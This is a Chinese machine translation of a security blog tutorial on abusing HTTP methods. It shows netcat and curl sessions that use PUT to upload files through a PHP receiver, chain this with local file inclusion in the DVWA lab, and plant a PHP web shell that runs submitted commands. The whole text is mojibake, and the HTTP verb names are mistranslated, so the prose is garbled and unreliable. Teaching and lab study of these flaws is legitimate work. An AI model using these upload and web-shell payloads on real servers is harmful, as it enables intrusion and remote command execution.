# åˆ©ç”¨ HTTP åŠ¨è¯

> åŸæ–‡ï¼š<https://infosecwriteups.com/exploiting-http-verbs-c7b42f365cf4?source=collection_archive---------1----------------------->

HTTP åè®®ç”±ä¸‹åˆ—åŠ¨è¯æˆ–æ–¹æ³•ç»„æˆã€‚

*   å¾—åˆ°
*   å¤´
*   é‚®æ”¿
*   æ”¾
*   åˆ é™¤
*   è¿æ¥
*   é€‰æ‹©
*   æ‰¾åˆ°ï¼›æŸ¥å‡º

æˆ‘å°†å±•ç¤ºä¸€äº›æœ‰è¶£çš„ HTTP åŠ¨è¯ï¼Œå®ƒä»¬å¯ä»¥ç”¨æ¥é—¯å…¥æœåŠ¡å™¨ã€‚å—¯ï¼Œè¿™äº›æ”»å‡»å¯èƒ½éå¸¸ç½•è§ï¼Œä½†è¯·è€ƒè™‘å…±äº«ğŸ™‚

æœåŠ¡å™¨ä¸­å¯ç”¨äº† OPTIONS è°“è¯ï¼Œå®ƒå¯ç”¨äºæŸ¥çœ‹æ‰€æœ‰å·²é…ç½®çš„ HTTP æ–¹æ³•ã€‚

```
% nc localhost 80
OPTIONS / HTTP/1.0HTTP/1.1 200 OK
Allow: OPTIONS, TRACE, GET, HEAD, POST
Server: Microsoft-IIS/7.5
Public: OPTIONS, TRACE, GET, HEAD, POST
X-Powered-By: ASP.NET
Date: Sun, 14 Jun 2015 05:31:10 GMT
Connection: close
```

åˆ é™¤åŠ¨è¯æ˜¯ä¸€ä¸ªå±é™©çš„åŠ¨è¯ï¼Œå¯èƒ½ä¼šè¢«è¯¯ç”¨ã€‚å¦‚æœé…ç½®é”™è¯¯ï¼Œå¯ç”¨äºä» web æœåŠ¡å™¨ä¸Šåˆ é™¤èµ„æºã€‚

```
% nc localhost 80
DELETE  /location/resource HTTP/1.0Date: Sun, 14 Jun 2015 05:01:22 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Set-Cookie: PHPSESSID=ete39c4b0uk83phvucj1ftbsn5; expires=Mon, 15 Jun 2015 05:01:22 GMT; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
```

è¯¥åŠ¨è¯å¯ç”¨äºå°†èµ„æºä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªå±é™©çš„åŠ¨è¯ã€‚æ¯”å¦‚ï¼Œå‡è®¾æˆ‘ä»¬è¦å†™â€œ*â€<ï¼ŸPHP echoâ€˜Hello Worldâ€™ï¼›ï¼Ÿ>* åœ¨æ–°æ–‡ä»¶ä¸­å‘½åä¸ºâ€œhello.phpâ€ã€‚ç¡®ä¿ç»™å‡ºæ­£ç¡®çš„æœ‰æ•ˆè½½è·é•¿åº¦ã€‚

```
%  cat -e hello.php 
<?php echo 'Hello World'; ?>$% wc -m hello.php 
29 hello.php% nc localhost 80
PUT /hello.php HTTP/1.0
Content-Type: text/html
Content-Length: 29<?php echo 'Hello World'; ?>
```

PHP æ”¯æŒ PUT åŠ¨è¯ã€‚è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹ç¨‹åºï¼Œå®ƒå°†ä» PUT è¯·æ±‚ä¸­æ¥æ”¶æ•°æ®ï¼Œå¹¶å°†å…¶ä¿å­˜ä¸ºâ€œ *myfile* â€ã€‚

```
<?php
    $putdata = fopen("php://input", "r");
    $fp = fopen("myfile", "w");
    while ($data = fread($putdata, 1024)) fwrite($fp, $data);
    fclose($fp);
    fclose($putdata);
?>
```

æˆ‘å°†æŠŠå®ƒä½œä¸ºâ€œput.phpâ€ä¿å­˜åœ¨ web æœåŠ¡å™¨çš„æ ¹ç›®å½•ä¸‹ã€‚
ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ put åŠ¨è¯è¯·æ±‚â€œput.php â€,å¹¶å‘é€æˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ã€‚

```
% cat -e phpinfo.php 
<?php phpinfo(); ?>$% wc -m phpinfo.php 
20 phpinfo.php% nc 192.168.1.5 80
PUT /put.php HTTP/1.0
Content-Type: text/html
Content-Length: 20<?php phpinfo(); ?>
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2015 06:48:16 GMT
Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22
X-Powered-By: PHP/5.4.22
Content-Length: 0
Connection: close
Content-Type: text/html
```

ç°åœ¨ï¼Œå¦‚æœä½ æŸ¥çœ‹" *myfile* "æˆ‘ä»¬çš„æœ‰æ•ˆè½½è·åº”è¯¥å†™å¾—å¾ˆå¥½ã€‚
å‡è®¾æ‚¨æœ‰ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶åŒ…å«æƒ…å†µï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ PUT æ¥åŒ…å«æˆ‘ä»¬æ–°ç¼–å†™çš„æ–‡ä»¶ã€‚
è¿™æ˜¯æœ¬åœ°æ–‡ä»¶åŒ…å«çš„ä¸€ä¸ªä¾‹å­ã€‚æˆ‘å°†ç”¨ DVWA æ¥æ¼”ç¤ºè¿™ä¸€ç‚¹ã€‚

```
<?php
    echo "File included: ".$_REQUEST["page"]."&lt;br&gt;";
    $file =  $_REQUEST["page"];
    include $file;
?>
```

`[http://localhost/dvwa/vulnerabilities/fi/?page=](http://localhost/dvwa/vulnerabilities/fi/?page=)../../../myfile`

![](img/f96106cba92b0f840aecb7d83b9f48b0.png)

å‡è®¾æˆ‘ä»¬æƒ³è¦ä¸Šä¼ ä¸€ä¸ªç®€å•çš„ web shellï¼Œæˆ‘ä»¬å¯ä»¥åƒä¸‹é¢è¿™æ ·åšğŸ˜‰

```
% wc -m shell.php 
189 shell.php% nc 192.168.1.5 80
PUT /put.php HTTP/1.0
Content-Type: text/html
Content-Length: 189<?phpprint '<form method="post">
Command: <input type="text" name="__"><br>
<input type="submit">
</form>';if(isset($_POST["__"]))
 print '<pre>'.shell_exec($_POST["__"]).'</pre>';?>
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2015 07:39:42 GMT
Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22
X-Powered-By: PHP/5.4.22
Content-Length: 0
Connection: close
Content-Type: text/html
```

åœ¨é‚£ä¹‹ååŒ…æ‹¬æˆ‘ä»¬çš„â€œ *myfile* â€ï¼Œä½ å°±å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤äº†ã€‚

![](img/a630b36c0334610b5fd15a4e435d8588.png)

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ curl é€šè¿‡ PUT è½»æ¾ä¸Šä¼ æ–‡ä»¶ã€‚

```
% curl [http://192.168.1.5/put.php](http://192.168.1.5/put.php) --upload-file shell.php -v
* About to connect() to 192.168.1.5 port 80 (#0)
*   Trying 192.168.1.5...
* connected
* Connected to 192.168.1.5 (192.168.1.5) port 80 (#0)
> PUT /put.php HTTP/1.1
> User-Agent: curl/7.26.0
> Host: 192.168.1.5
> Accept: */*
> Content-Length: 189
> Expect: 100-continue
> 
* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 100 Continue
* additional stuff not fine transfer.c:1037: 0 0
* We are completely uploaded and fine
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 200 OK
< Date: Mon, 15 Jun 2015 07:47:44 GMT
< Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22
< X-Powered-By: PHP/5.4.22
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host 192.168.1.5 left intact
* Closing connection #0
```

æ„Ÿè°¢é˜…è¯»ï¼

ã€1ã€‘[http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html](http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html)
ã€2ã€‘[https://tools.ietf.org/html/rfc7231](https://tools.ietf.org/html/rfc7231)

*åŸè½½äº 2015 å¹´ 6 æœˆ 14 æ—¥*[*http://osandamalith.com*](https://osandamalith.com/2015/06/14/exploiting-http-verbs/)*ã€‚*